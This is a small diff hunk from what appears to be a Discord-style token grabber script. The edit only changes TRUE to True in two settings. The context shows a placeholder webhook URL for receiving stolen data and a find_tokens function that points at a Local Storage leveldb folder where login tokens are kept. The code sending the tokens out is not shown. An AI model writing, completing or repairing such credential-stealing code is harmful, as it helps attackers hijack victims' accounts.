@@ -9,8 +9,8 @@ WEBHOOK_URL = 'ENTER WEBHOOK URL HERE'
 
 # Settings
 PING_ME = False
-ONLINE = TRUE
-OFFLINE = TRUE
+ONLINE = True
+OFFLINE = True
 
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
